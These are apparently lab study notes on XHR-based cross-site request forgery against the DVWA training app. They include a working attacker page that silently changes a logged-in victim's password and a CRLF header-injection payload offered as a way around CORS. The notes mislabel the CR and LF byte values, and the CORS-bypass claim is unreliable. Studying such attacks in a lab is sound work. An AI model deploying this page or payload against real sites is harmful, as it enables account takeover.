#### 2.1. CSRF via XHR (low security DVWA)

Notes:
- Burp Suite can help you generate CSRF requests (Engagement tools -> Generate CSRF PoC)
- CSRF will be triggered every time a user of site X visits our malicious page
- user may (not) have to be authenticated on the target website (typically they are)
- request will be sent via `XMLHttpRequest` (works in most browsers nowadays)
- the advantage of XHR is that the victim is not aware of the malicious requests
  - they will not be redirected to target website (no suspicious activity)
- CORS (Cross Origin Resource Sharing) policy only blocks the response from the victim website (however, the request goes through according to Burp/server logs)
```
Access to XMLHttpRequest at 'http://172.16.201.160/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change' from origin 'http://localhost:8081' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```
- bypassing CORS is possible via HTTP header-injection vulnerability (a.k.a `CR-0x13` & `LF-0x10` injection or `\r\n`)

/?param_x=%0d%0aAccess-Control-Allow-Origin:*

#### 2.2. PoC attacker page could look like

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      function submitRequest()
      {
      	var url = "http://172.16.201.160/vulnerabilities/csrf/?";
      	var params = "password_new=123&password_conf=123&Change=Change"

        var xhr = new XMLHttpRequest();
        xhr.open("GET", url + params, true);
        xhr.withCredentials = true;
        var body = ""; // var body = params; // for POST request
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
  </body>
</html>
```
